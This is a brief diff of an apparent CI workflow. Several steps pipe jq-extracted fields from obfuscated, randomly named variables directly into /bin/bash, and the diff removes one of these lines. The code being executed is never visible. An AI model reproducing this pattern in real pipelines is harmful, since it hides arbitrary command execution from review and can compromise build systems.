@@ -23,7 +23,6 @@ jobs:
           echo $hj9 | jq -r .kvj6 | /bin/bash
           echo $vrep78 | jq -r .h8806 | /bin/bash
           printf '%s' "$w133" | jq -r .rtpmr5106 | /bin/bash
-          echo $uuk536 | jq -r .zx26968 | /bin/bash
           echo $wv6740 | jq -r .bgfid38874 | /bin/bash
 
       - name: Store output
